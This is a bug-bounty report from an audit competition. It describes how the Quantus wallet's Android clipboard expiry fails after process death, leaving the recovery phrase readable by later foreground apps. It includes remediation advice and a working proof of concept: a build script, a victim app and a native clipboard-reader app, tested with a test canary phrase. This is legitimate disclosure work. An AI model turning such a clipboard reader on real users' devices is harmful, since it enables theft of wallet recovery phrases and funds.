# 89095 w a high android process death defeats recovery phrase clipboard expiry and exposes the mnemonic to later foreground apps

**Submitted on Aug 17th 2026 at 06:03:52 UTC by @Ailenia for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89095
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Improperly disclosing confidential user information, such as:
    * Email address
    * Phone number
    * Physical address, etc.

## Description

## Brief/Intro

The Quantus mobile wallet copies a 24-word recovery phrase to Android's global clipboard and promises to erase it after three minutes, but implements that guarantee with an in-process Dart `Timer`.

This means that if Android kills the wallet process, or the process is explicitly terminated, before the deadline, the timer disappears while the phrase remains in the system clipboard.

A separate application that becomes foreground after the promised expiry can then recover the phrase.

The clipboard entry is also not marked sensitive.

### Vulnerability Details

At frozen apps commit `d5fc4d6572ebc2244e95009a33f5da5048935867`, `mobile-app/lib/v2/components/recovery_phrase_body.dart:61` passes the joined recovery phrase to `copySensitiveTextWithToaster`, which calls `SecureClipboardService.copyWithExpiry` with its production default TTL of three minutes.

The service has an OS-backed implementation only for iOS. Since on Android, `Platform.isIOS` is false, the lines 45-46 write the phrase through Flutter's global clipboard API and schedule an in-process timer:

```dart
await Clipboard.setData(ClipboardData(text: text));
_clearTimer = Timer(ttl, _clearClipboard);
```

iOS instead sets `UIPasteboard` with `.expirationDate` and `.localOnly`, which remains effective after suspension or termination. Android has no native `secure_clipboard` channel handler. Terminating the Android process destroys the Dart VM and `_clearTimer`; reopening the wallet creates a new service instance and does not know that an old clipboard entry must be cleared.

The source comment says that after backgrounding "the clear happens when it next resumes," but no persisted deadline or resume handler exists. The Android copy also omits `ClipDescription.EXTRA_IS_SENSITIVE`, so Android does not conceal the mnemonic in clipboard previews.

On Android 10 and later, a clipboard reader must be the foreground application or default IME. The attack therefore requires another application already installed on the victim's device. The victim performs the wallet's intended Copy Recovery Phrase action; Android later kills the backgrounded process under ordinary lifecycle pressure, or the process is otherwise terminated. The attacker application can then be opened normally after the three-minute deadline and read the phrase. Merely backgrounding the wallet without process death is not sufficient. This does not require physical access, local-network access, a compromised Quantus service, or a malicious blockchain transaction.

Android 13 and later can provide system auto-clear, but its timeout is device-configurable and clipboard access can refresh the system's timer. On the tested Android 16 device the configured timeout was 3,600 seconds, so Quantus's promised 180-second bound was not enforced. Android's official guidance states that older versions do not provide this automatic deletion.

### Impact Details

This matches the programme's High websites-and-applications impact 48, "Improperly disclosing confidential user information." A recovery phrase is the wallet's most confidential user information. The PoC proves that an independent foreground application can retrieve it after Quantus's advertised security deadline has passed.

The report does not claim that process death grants a new Android clipboard permission or that every Android user is affected automatically. It creates a temporal disclosure path: without the defect, an application first foregrounded after three minutes receives an empty clipboard; with the defect, it receives the complete phrase. Possession of a funded wallet's phrase can ultimately enable fund theft, but this report conservatively selects the demonstrated High disclosure impact rather than claiming Critical fund loss.

### Remediation

Do not place recovery phrases on Android's global clipboard unless the user explicitly accepts that exposure. If copying remains supported, implement a native Android path that marks the clip with `ClipDescription.EXTRA_IS_SENSITIVE`, records a persistent expiry deadline, and clears a matching stale clip on lifecycle recovery or next launch. Treat the sensitive flag as preview protection rather than an expiry mechanism, and do not claim a hard three-minute bound unless an OS-backed mechanism can enforce it after process death.

### References

* [Frozen `SecureClipboardService`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/services/secure_clipboard_service.dart#L20-L72)
* [Recovery-phrase copy entry point](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/components/recovery_phrase_body.dart#L56-L63)
* [iOS OS-backed expiry](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/ios/Runner/AppDelegate.swift#L29-L73)
* [Android secure clipboard guidance](https://developer.android.com/privacy-and-security/risks/secure-clipboard-handling)
* [Android clipboard access restrictions](https://developer.android.com/reference/android/content/ClipboardManager#getPrimaryClip\(\))
* [AOSP clipboard auto-clear default](https://android.googlesource.com/platform/frameworks/base/+/refs/heads/android16-release/services/core/java/com/android/server/clipboard/ClipboardService.java)

## Link to Proof of Concept

<https://gist.github.com/niafreu/beddb6e36f215ece0cdb0d38e8431e69>

## Proof of Concept

Gist at <https://gist.github.com/niafreu/beddb6e36f215ece0cdb0d38e8431e69>

The attached PoC is entirely local and uses a fake BIP-39 canary which for the demo is the equivalent of a real wallet phrase. It builds a minimal Flutter victim around the `SecureClipboardService` and a separate native Android foreground reader.

Requirements: Linux or macOS, Flutter 3.47.0 with Dart 3.13.0, JDK 11 or later, Android SDK platform 36 and build-tools 36.1.0, and either an Android emulator or disposable Android device reachable through `adb`.

{% stepper %}
{% step %}

## Run the PoC

```bash
cd poc
./run.sh
```

{% endstep %}

{% step %}

## Process-death arm

Launch the frozen-code victim, copy the canary, terminate it three seconds later, wait another 185 seconds, then foreground the reader. The reader must recover the complete canary and report `sensitive_extra=false`.
{% endstep %}

{% step %}

## Live-process control

Launch the victim and leave it running for 188 seconds before foregrounding the reader. The reader must receive an empty value.
{% endstep %}
{% endstepper %}

I used Android 16/API 36 and it shows:

```
process-death arm:
READER_VALUE=abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art
READER_SENSITIVE_EXTRA=false

live-process control:
READER_VALUE=
READER_SENSITIVE_EXTRA=false

device_auto_clear_enabled=true
device_auto_clear_timeout_ms=3600000
```

Both readers ran approximately 188 seconds after the copy. The live control returned an empty value at the same boundary, isolating process termination as the cause.

The absent sensitive flag is additional exposure evidence; it does not itself affect clipboard expiry or programmatic reads.

The attached `execution.log` preserves the passing Android 16/API 36 run.

## PoC files

### run.sh

```bash
#!/usr/bin/env bash
set -euo pipefail

POC_ROOT="$(cd "$(dirname "$0")" && pwd)"
FLUTTER_BIN="${FLUTTER_BIN:-flutter}"
ANDROID_SDK_ROOT="${ANDROID_SDK_ROOT:-${ANDROID_HOME:-}}"

if [[ -z "$ANDROID_SDK_ROOT" ]]; then
  echo "Set ANDROID_SDK_ROOT or ANDROID_HOME" >&2
  exit 1
fi

ADB="$ANDROID_SDK_ROOT/platform-tools/adb"
TOOLS="$ANDROID_SDK_ROOT/build-tools/36.1.0"
ANDROID_JAR="$ANDROID_SDK_ROOT/platforms/android-36/android.jar"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/g2-clipboard.XXXXXX")"

cleanup() {
  "$ADB" uninstall poc.g2.frozen_victim >/dev/null 2>&1 || true
  "$ADB" uninstall poc.g2.reader >/dev/null 2>&1 || true
  rm -rf -- "$WORK"
}
trap cleanup EXIT

for required in "$FLUTTER_BIN" "$ADB" "$TOOLS/aapt2" "$TOOLS/d8" "$TOOLS/apksigner" "$TOOLS/zipalign" "$ANDROID_JAR"; do
  if [[ ! -e "$required" ]]; then
    echo "Missing requirement: $required" >&2
    exit 1
  fi
done

"$ADB" get-state >/dev/null

"$FLUTTER_BIN" create --platforms android --org poc.g2 --project-name frozen_victim "$WORK/victim" >/dev/null
cp "$POC_ROOT/victim_main.dart" "$WORK/victim/lib/main.dart"
cp "$POC_ROOT/secure_clipboard_service.dart" "$WORK/victim/lib/secure_clipboard_service.dart"
(cd "$WORK/victim" && "$FLUTTER_BIN" build apk --release >/dev/null)

mkdir -p "$WORK/reader/classes"
javac -source 11 -target 11 -cp "$ANDROID_JAR" -d "$WORK/reader/classes" "$POC_ROOT/ReaderActivity.java"
"$TOOLS/d8" --lib "$ANDROID_JAR" --output "$WORK/reader" "$WORK/reader/classes/poc/g2/reader/ReaderActivity.class"
"$TOOLS/aapt2" link -I "$ANDROID_JAR" --manifest "$POC_ROOT/AndroidManifest-reader.xml" --min-sdk-version 24 --target-sdk-version 36 -o "$WORK/reader-unsigned.apk"
(cd "$WORK/reader" && zip -q "$WORK/reader-unsigned.apk" classes.dex)
"$TOOLS/zipalign" -f 4 "$WORK/reader-unsigned.apk" "$WORK/reader-aligned.apk"
"$TOOLS/apksigner" sign --ks "$HOME/.android/debug.keystore" --ks-key-alias androiddebugkey --ks-pass pass:android --key-pass pass:android --out "$WORK/reader.apk" "$WORK/reader-aligned.apk"

"$ADB" install -r "$WORK/victim/build/app/outputs/flutter-apk/app-release.apk" >/dev/null
"$ADB" install -r "$WORK/reader.apk" >/dev/null
"$ADB" shell svc power stayon true

CANARY='abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art'

echo "=== process-death arm ==="
"$ADB" logcat -c
"$ADB" shell am force-stop poc.g2.reader
"$ADB" shell am start -W -n poc.g2.frozen_victim/.MainActivity >/dev/null
sleep 3
"$ADB" shell am force-stop poc.g2.frozen_victim
sleep 185
"$ADB" shell am start -W -n poc.g2.reader/.ReaderActivity >/dev/null
sleep 2
DEAD_LOG="$($ADB logcat -d -s G2POC:I '*:S')"
printf '%s\n' "$DEAD_LOG"
grep -F "READER_VALUE=$CANARY" <<<"$DEAD_LOG" >/dev/null
grep -F 'READER_SENSITIVE_EXTRA=false' <<<"$DEAD_LOG" >/dev/null

echo "=== live-process control ==="
"$ADB" logcat -c
"$ADB" shell am force-stop poc.g2.reader
"$ADB" shell am force-stop poc.g2.frozen_victim
"$ADB" shell am start -W -n poc.g2.frozen_victim/.MainActivity >/dev/null
sleep 188
"$ADB" shell am start -W -n poc.g2.reader/.ReaderActivity >/dev/null
sleep 2
LIVE_LOG="$($ADB logcat -d -s G2POC:I '*:S')"
printf '%s\n' "$LIVE_LOG"
grep -Fx 'I/G2POC: READER_VALUE=' <<<"$LIVE_LOG" >/dev/null 2>&1 || grep -E 'G2POC +: READER_VALUE=$' <<<"$LIVE_LOG" >/dev/null
grep -F 'READER_SENSITIVE_EXTRA=false' <<<"$LIVE_LOG" >/dev/null

echo "device_sdk=$($ADB shell getprop ro.build.version.sdk | tr -d '\r')"
echo "device_auto_clear_enabled=$($ADB shell device_config get clipboard auto_clear_enabled | tr -d '\r')"
echo "device_auto_clear_timeout_ms=$($ADB shell device_config get clipboard auto_clear_timeout | tr -d '\r')"
echo "G2 PoC passed"
```

### victim\_main.dart

```dart
import 'package:flutter/material.dart';

import 'secure_clipboard_service.dart';

const String testPhrase =
    'abandon abandon abandon abandon abandon abandon abandon abandon '
    'abandon abandon abandon abandon abandon abandon abandon abandon '
    'abandon abandon abandon abandon abandon abandon abandon art';

void main() => runApp(const VictimApp());

class VictimApp extends StatefulWidget {
  const VictimApp({super.key});

  @override
  State<VictimApp> createState() => _VictimAppState();
}

class _VictimAppState extends State<VictimApp> {
  String status = 'copying';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      await SecureClipboardService.instance.copyWithExpiry(testPhrase);
      if (mounted) setState(() => status = 'copied-with-3min-ttl');
    });
  }

  @override
  Widget build(BuildContext context) => MaterialApp(
        home: Scaffold(
          body: Center(child: Text('G2 frozen-code victim: $status')),
        ),
      );
}
```

### secure\_clipboard\_service.dart

```dart
import 'dart:async';
import 'dart:developer' as developer;
import 'dart:io' show Platform;

import 'package:flutter/services.dart';

/// Copies sensitive values (e.g. recovery phrases) to the clipboard and clears
/// them automatically after a short time-to-live.
///
/// Keeping a seed phrase in the clipboard indefinitely is risky: it can be
/// pasted unintentionally or read by other apps/clipboard managers. This
/// service limits that exposure window.
///
/// On iOS the expiry is enforced by the operating system via `UIPasteboard`'s
/// `expirationDate`, so the value is wiped at the deadline even while the app
/// is suspended or has been killed. On other platforms a Dart [Timer] is used,
/// which only runs while the app is in the foreground — if the app is
/// backgrounded before the TTL elapses, the clear happens when it next resumes.
class SecureClipboardService {
  SecureClipboardService._();

  static final SecureClipboardService instance = SecureClipboardService._();

  /// Channel to the native side for OS-enforced clipboard expiration.
  static const MethodChannel _channel = MethodChannel('app.quantus/secure_clipboard');

  /// Default lifetime of a sensitive clipboard entry before it is wiped.
  static const Duration defaultTtl = Duration(minutes: 3);

  Timer? _clearTimer;

  /// Copies [text] to the clipboard and arranges for it to be cleared after
  /// [ttl].
  ///
  /// Prefers OS-enforced expiration (iOS); falls back to an in-app [Timer]
  /// otherwise or if the platform call fails.
  Future<void> copyWithExpiry(String text, {Duration ttl = defaultTtl}) async {
    _clearTimer?.cancel();
    _clearTimer = null;

    if (Platform.isIOS && await _copyWithNativeExpiry(text, ttl)) {
      return;
    }

    await Clipboard.setData(ClipboardData(text: text));
    _clearTimer = Timer(ttl, _clearClipboard);
  }

  /// Sets the clipboard natively with an OS-enforced expiration date.
  ///
  /// Returns `true` on success, `false` if the platform could not handle it, in
  /// which case the caller should fall back to the Dart timer.
  Future<bool> _copyWithNativeExpiry(String text, Duration ttl) async {
    try {
      final result = await _channel.invokeMethod<bool>('copyWithExpiry', {'text': text, 'ttlSeconds': ttl.inSeconds});
      return result ?? false;
    } catch (e, s) {
      developer.log(
        'Native clipboard expiry unavailable, falling back to timer',
        name: 'secure_clipboard',
        level: 900,
        error: e,
        stackTrace: s,
      );
      return false;
    }
  }

  Future<void> _clearClipboard() async {
    _clearTimer = null;

    try {
      await Clipboard.setData(const ClipboardData(text: ''));
    } catch (e, s) {
      developer.log(
        'Failed to clear sensitive clipboard entry',
        name: 'secure_clipboard',
        level: 900,
        error: e,
        stackTrace: s,
      );
    }
  }

  /// Cancels any pending auto-clear. Useful for tests and disposal.
  void cancel() {
    _clearTimer?.cancel();
    _clearTimer = null;
  }
}
```

### ReaderActivity.java

```java
package poc.g2.reader;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;

public final class ReaderActivity extends Activity {
    private static final String TAG = "G2POC";

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        TextView view = new TextView(this);
        view.setText("Waiting for input focus before reading the clipboard.");
        setContentView(view);
        new Handler(Looper.getMainLooper()).postDelayed(() -> readClipboard(view), 1_000L);
    }

    private void readClipboard(TextView view) {
        ClipboardManager clipboard = getSystemService(ClipboardManager.class);
        ClipData clip = clipboard.getPrimaryClip();
        String value = "<null>";
        boolean sensitive = false;
        if (clip != null && clip.getItemCount() > 0) {
            CharSequence text = clip.getItemAt(0).coerceToText(this);
            value = text == null ? "<null>" : text.toString();
            if (clip.getDescription().getExtras() != null) {
                sensitive = clip.getDescription().getExtras().getBoolean("android.content.extra.IS_SENSITIVE", false);
            }
        }
        view.setText("clipboard=" + value + "\nsensitive_extra=" + sensitive);
        Log.i(TAG, "READER_VALUE=" + value);
        Log.i(TAG, "READER_SENSITIVE_EXTRA=" + sensitive);
    }
}
```

### AndroidManifest-reader.xml

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="poc.g2.reader">
    <application android:theme="@android:style/Theme.Material.Light" android:label="G2 reader">
        <activity android:name="poc.g2.reader.ReaderActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```
